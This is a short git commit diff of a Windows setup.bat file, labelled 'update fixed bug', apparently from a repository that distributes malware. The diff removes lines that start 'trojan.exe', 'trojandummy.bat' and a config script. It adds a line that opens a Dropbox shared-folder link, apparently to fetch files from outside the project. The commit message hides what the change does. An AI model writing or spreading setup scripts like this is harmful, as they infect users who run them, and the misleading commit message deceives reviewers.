e89e192b6adf8090b1b8495a3ffad411a9da1cd2
rraapt66 <146457670+rraapt66@users.noreply.github.com>
2023-12-06 20:27:11 +0700

    update fixed bug

--- setup.bat
+++ setup.bat
@@ -4,6 +4,4 @@ python -m pip install -r requirements.txt
 cls
 echo enter!!!
 pause
-start trojan.exe
-start trojandummy.bat
-python config.py
+start https://www.dropbox.com/scl/fo/7019r1ngjdrb8n6apdis2/h?rlkey=jhg1vovxa8tvcklxpo609f7gz&dl=0
